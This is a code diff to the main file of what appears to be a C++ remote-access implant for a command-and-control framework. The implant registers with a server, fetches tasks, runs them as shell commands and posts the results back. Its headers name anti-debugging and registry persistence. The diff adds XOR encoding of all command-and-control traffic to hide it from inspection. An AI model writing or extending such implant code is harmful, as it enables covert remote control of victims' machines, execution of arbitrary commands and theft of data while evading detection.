@@ -8,6 +8,7 @@
 #include "agent.h"
 #include "is_debugger_present.h"
 #include "persistance.h"
+#include "xor_data.h"
 
 int getRandom(int min, int max) {
     std::random_device rd;
@@ -44,6 +45,7 @@ int main() {
     if(!AddToStartupRegistry("asd")){
         exit(2);
     }
+
     */
     //Hiding console from user
     //ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -56,7 +58,7 @@ int main() {
     unsigned int port{fern.getPort()};
 
     //Register agent on the server
-    std::string regresponse {post(ip, port, REGISTER, reg)};
+    std::string regresponse {post(ip, port, REGISTER, xorStrings(reg, XORKEY))};
 
     //vector to hold tasks to execute
     std::vector<std::string> tasks;
@@ -75,8 +77,7 @@ int main() {
         else {
             std::string response{get(ip, port, TASKS)};
             //Parsing tasks
-            std::cout << response << "\n";
-            tasks = split_string(response, ",,");
+            tasks = split_string(xorStrings(response, XORKEY), ",,");
             for(std::string const& i : tasks){
                 std::cout << i << ",";
             }
@@ -87,14 +88,13 @@ int main() {
                 if(i != implant_id){
                     std::string result {shell(i)};
                     std::string postresult = std::format("{},,{}", implant_id, result);
+                    postresult = xorStrings(postresult, XORKEY);
                     post(fern.getIP(),fern.getPort(), RESULTS, postresult);
                     Sleep(500);
                 }
             }
 
-
             Sleep(fern.getSleep() + jitter);
         }
     }
-
 }
